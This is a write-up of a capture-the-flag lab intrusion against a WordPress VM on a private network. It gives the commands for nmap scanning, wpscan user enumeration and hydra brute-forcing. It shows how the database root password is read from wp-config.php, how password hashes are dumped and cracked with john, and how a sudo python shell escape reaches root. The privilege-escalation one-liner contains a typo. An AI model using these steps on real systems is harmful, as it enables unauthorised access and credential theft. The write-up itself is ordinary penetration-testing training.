# Offensive Engagement
## Find the Target VM
To find the target VM we need to use nmap to enumerate the network. we can start with a `nmap -sV 192.168.1.0/24` to find which hosts are up and find out which services and version they are running.
![network-scan](Images/nmap-enumeration.png)
  - We can see that one of the hosts `192.168.1.110` is running **Apache httpd 2.4.10**. We know that Apache is used to run HTTP servers, and that this version of Apache is outdated and can be exploited.
## Exploit the Target
Now that we located the vulnerable target we can exploit it using a wordpress scan. `wpscan --url http://192.168.1.110/wordpress -eu`
![wordpress-enum](Images/wpscan-enum.png)
  - This wordpress scan uses a brute force attack to enumerate user accounts on the wordpress site. Two users are given *michael* and *steven*. Both of these usernames can be used to gain a user shell.
We are able to gain access to michaels account by using a simple guess **password=michael**. In other cases we could have used the hydra command to be able to brute force his password. `hydra -l michael -p /path/to/wordlists.txt -s 80 -f -vV 192.168.1.110 http-get /login.php`

## Finding the flags
Now that we are in michaels account we can use commands to find the flag names. To find the first flag we used the `find` command.
- `find . -type f -iname *flag* 2>/dev/null`
![flag2](Images/flag-2.png)
This command located flag2.txt as well as other places that other flags might be in. A hint was presented to me saying that the first flag may be imbedded in a file. This prompted me to do a recurssive search in all html files. We need to change directories to `/var/www`
- `grep -RE flag html`
![flag1](Images/flag-1.png)
- We found flag one embeeded in the service.html file. For fun I located the flag in the source code of that html page.
![flag1-source](Images/flag1-source.png)
## Finding MySQL Database password
After finding the necessary flags in michaels account we direct our attention to finding information to login into the MySQL database. We know this information has to be in a configuration file. `nano /var/www/html/wordpress/wp-config.php`
![db-info](Images/wordpress-db-info.png)
- This config file gives us the password for the `root` account. **R@v3nSecurity**
## Navigating through MySQL
This section provides the commands used in order to get the password hashes for michael and steven's accounts as well as the steps taken to find the other flags.
- To login to MySQL we ran the command `mysql -u root -p` and entered the password we found for the root account.
- We then listed the databases. `show databases;`
- Switched to the wordpress database `use wordpress`
- Listed the tables in the database `show tables;`
- Selected all columns from the posts table `select * from wp_posts`
![flag3](Images/flag3.png)
- Selected all columns from the user table `select * from wp_users`
![hashse](Images/database-hashes.png)
  - This gave us the password hashes for each account. We can input these hashes, in the proper format, into a text file and use `john` to crack the password hashes.
![john](Images/john-passwd.jpg)

## Privilege Escalation
Now that we have steven's password we can login into his account on the wordpress site. `ssh steven@192.168.1.110` **password:pink84**
Steven's account is limited to his sudo access and only one command on his account. That command being **python**. Seeing that we are limited I searched for escalation methods using the python command. The one I found is as follows. `sudo python -c 'import pyt;pty.spawn("/bin/bash");'`
![priv](Images/list-priv.PNG)
  - In order for this escalation method to work it needs to be ran with sudo privileges. This python command simply opens up a bash shell. This is why it is important to run it as sudo so that python opens the shell with escalated privileges.
Now that we are in the root account we can then find the last flag by using the find command. `find . -type f -iname *flag* 2>/dev/null`




